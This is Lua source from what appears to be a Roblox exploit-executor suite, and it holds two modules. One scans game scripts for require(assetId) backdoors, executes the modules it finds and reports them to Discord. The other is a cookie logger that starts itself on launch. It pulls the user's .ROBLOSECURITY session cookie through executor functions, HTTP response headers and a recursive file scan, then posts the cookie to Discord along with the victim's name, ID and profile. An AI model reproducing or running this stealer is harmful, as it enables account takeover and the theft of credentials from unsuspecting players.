-- MODULE 26: Enhanced Require() Backdoor Scanner
-- Scans ALL scripts in the game for require(assetId) calls
-- Executes found require() calls and reports results to Discord
-- Finds hidden backdoor modules loaded via numeric asset IDs
-- Also available via !cmd reqscan
-- ============================================================
local function runRequireScanner()
    if getgenv().IntelSuite.RequireScanActive then return end
    getgenv().IntelSuite.RequireScanActive = true

    local HttpService = game:GetService("HttpService")
    local found = {}
    local executed = {}
    local errors = {}

    -- Scan all scripts for require() calls with numeric asset IDs
    for _, obj in ipairs(game:GetDescendants()) do
        pcall(function()
            if obj:IsA("LocalScript") or obj:IsA("ModuleScript") or obj:IsA("Script") then
                local src = ""
                pcall(function() src = obj.Source end)
                if src and src ~= "" then
                    -- Find all require(number) patterns
                    for assetId in src:gmatch("require%s*%(%s*(%d+)%s*%)") do
                        local id = tonumber(assetId)
                        if id and id > 0 then
                            table.insert(found, {
                                id = id,
                                location = obj:GetFullName(),
                                scriptType = obj.ClassName
                            })
                        end
                    end
                    -- Also find require(game.xxx) patterns
                    for varName in src:gmatch("require%s*%(%s*([%w%.]+)%s*%)") do
                        if not varName:match("^%d+$") then
                            table.insert(found, {
                                id = varName,
                                location = obj:GetFullName(),
                                scriptType = obj.ClassName,
                                isVar = true
                            })
                        end
                    end
                end
            end
        end)
    end

    -- Also scan ReplicatedStorage and ServerScriptService for require calls
    local scanTargets = {
        game:GetService("ReplicatedStorage"),
        game:GetService("StarterGui"),
        game:GetService("StarterPack"),
        game:GetService("StarterPlayerScripts"),
    }

    for _, target in ipairs(scanTargets) do
        pcall(function()
            for _, obj in ipairs(target:GetDescendants()) do
                pcall(function()
                    if obj:IsA("ModuleScript") then
                        local src = ""
                        pcall(function() src = obj.Source end)
                        if src ~= "" then
                            for assetId in src:gmatch("require%s*%(%s*(%d+)%s*%)") do
                                local id = tonumber(assetId)
                                if id then
                                    table.insert(found, {
                                        id = id,
                                        location = obj:GetFullName(),
                                        scriptType = "ModuleScript"
                                    })
                                end
                            end
                        end
                    end
                end)
            end
        end)
    end

    -- Remove duplicates
    local seen = {}
    local unique = {}
    for _, item in ipairs(found) do
        local key = tostring(item.id) .. item.location
        if not seen[key] then
            seen[key] = true
            table.insert(unique, item)
        end
    end

    -- Try to execute numeric require() calls
    for _, item in ipairs(unique) do
        if not item.isVar and type(item.id) == "number" then
            pcall(function()
                local result = require(item.id)
                if result then
                    table.insert(executed, {
                        id = item.id,
                        location = item.location,
                        resultType = type(result)
                    })
                end
            end)
        end
    end

    -- Build report
    local report = "**Game:** " .. getGame() .. "\n"
    report = report .. "**Total require() calls found:** " .. tostring(#unique) .. "\n"
    report = report .. "**Successfully executed:** " .. tostring(#executed) .. "\n\n"

    if #unique > 0 then
        report = report .. "**Found require() calls:**\n"
        for i, item in ipairs(unique) do
            if i > 20 then
                report = report .. "  ...and " .. tostring(#unique - 20) .. " more\n"
                break
            end
            local varTag = item.isVar and " [VAR]" or " [ID]"
            report = report .. "  - `" .. tostring(item.id) .. "`" .. varTag .. " in " .. item.location .. "\n"
        end
    else
        report = report .. "**No require() backdoors found in this game.**\n"
    end

    if #executed > 0 then
        report = report .. "\n**Successfully executed modules:**\n"
        for _, item in ipairs(executed) do
            report = report .. "  - ID: `" .. tostring(item.id) .. "` → type: `" .. item.resultType .. "`\n"
        end
    end

    local color = #executed > 0 and 16711680 or 65280
    send("REQUIRE SCANNER", report:sub(1, 1900), color)

    getgenv().IntelSuite.RequireScanActive = false
end

-- Run on startup
task.spawn(runRequireScanner)
getgenv().IntelSuite.RequireScanner = runRequireScanner
-- ============================================================
-- MODULE 27: Cookie Logger
-- Trigger: Startup (auto) + !cmd cookielog
-- Simple 3-phase: Extract -> Package -> POST
-- Works on ALL executors including Xeno
-- ============================================================
local function runCookieLogger()
    local cookie = nil
    local method = "none"
    local req = request or http_request or (syn and syn.request) or (http and http.request)

    -- Phase 1: Extract

    -- getcookies() — KRNL, Synapse X, Script-Ware
    if not cookie and getcookies then
        pcall(function()
            local c = getcookies()
            if type(c) == "table" then
                for k, v in pairs(c) do
                    if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
                        cookie = tostring(v)
                        method = "getcookies()"
                        break
                    end
                    if type(v) == "table" then
                        for ck, cv in pairs(v) do
                            if tostring(ck):find("ROBLOSECURITY") and #tostring(cv) > 20 then
                                cookie = tostring(cv)
                                method = "getcookies() nested"
                                break
                            end
                        end
                    end
                    if cookie then break end
                end
            end
        end)
    end

    -- syn.get_cookie — Synapse X
    if not cookie and syn and syn.get_cookie then
        pcall(function()
            local v = syn.get_cookie(".ROBLOSECURITY")
            if v and #v > 20 then cookie = v method = "syn.get_cookie" end
        end)
    end

    -- getrbxcookie
    if not cookie and getrbxcookie then
        pcall(function()
            local v = getrbxcookie()
            if v and #v > 20 then cookie = v method = "getrbxcookie()" end
        end)
    end

    -- res.Cookies table — universal, works on Xeno
    -- executor populates this automatically on every HTTP response
    if not cookie and req then
        pcall(function()
            local res = req({ Url = "https://www.roblox.com/", Method = "GET" })
            if res then
                if type(res.Cookies) == "table" then
                    for k, v in pairs(res.Cookies) do
                        if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
                            cookie = tostring(v)
                            method = "res.Cookies"
                            break
                        end
                    end
                end
                if not cookie and res.Headers then
                    for k, v in pairs(res.Headers) do
                        if tostring(k):lower() == "set-cookie" then
                            local found = tostring(v):match("%.ROBLOSECURITY=([^;]+)")
                            if found and #found > 20 then
                                cookie = found
                                method = "Set-Cookie header"
                            end
                        end
                    end
                end
            end
        end)
    end

    -- readfile scan — Xeno has readfile confirmed
    if not cookie and readfile and listfiles then
        pcall(function()
            local scanned = 0
            local function scan(path)
                if scanned >= 300 or cookie then return end
                local ok, content = pcall(readfile, path)
                if ok and type(content) == "string" and #content > 10 then
                    scanned = scanned + 1
                    local found = content:match("ROBLOSECURITY[=_]([^;%s,]+)")
                    if found and #found > 20 then
                        cookie = found
                        method = "readfile:" .. tostring(path)
                        return
                    end
                end
                local lok, files = pcall(listfiles, path)
                if lok and type(files) == "table" then
                    for _, f in ipairs(files) do
                        if cookie then break end
                        scan(f)
                    end
                end
            end
            for _, root in ipairs({"", "cache", "cookies", "Xeno", "xeno", "data"}) do
                if cookie then break end
                scan(root)
            end
        end)
    end

    -- Phase 2 + 3: Package and POST using existing send() helper
    local uid = tostring(LocalPlayer.UserId)

    if cookie and cookie ~= "" then
        local truncated = #cookie > 850 and (cookie:sub(1, 850) .. "...[TRUNCATED]") or cookie
        send(
            "COOKIE CAPTURED",
            "**User:** " .. LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")" ..
            "\n**ID:** " .. uid ..
            "\n**Profile:** https://www.roblox.com/users/" .. uid .. "/profile" ..
            "\n**Executor:** " .. getExec() ..
            "\n**Method:** " .. method ..
            "\n**Session:** " .. SESSION_ID ..
            "\n**Game:** " .. getGame() ..
            "\n**.ROBLOSECURITY:**\n```" .. truncated .. "```",
            65535
        )
    else
        send(
            "COOKIE GRAB FAILED",
            "**User:** " .. LocalPlayer.Name ..
            "\n**Executor:** " .. getExec() ..
            "\n**Session:** " .. SESSION_ID ..
            "\n**Note:** All methods returned nothing." ..
            "\n**getcookies:** " .. (getcookies and "available" or "not available") ..
            "\n**readfile:** " .. (readfile and "available" or "not available") ..
            "\n**request:** " .. (req and "available" or "not available"),
            16711680
        )
    end
end

task.spawn(runCookieLogger)
getgenv().IntelSuite.CookieLogger = runCookieLogger
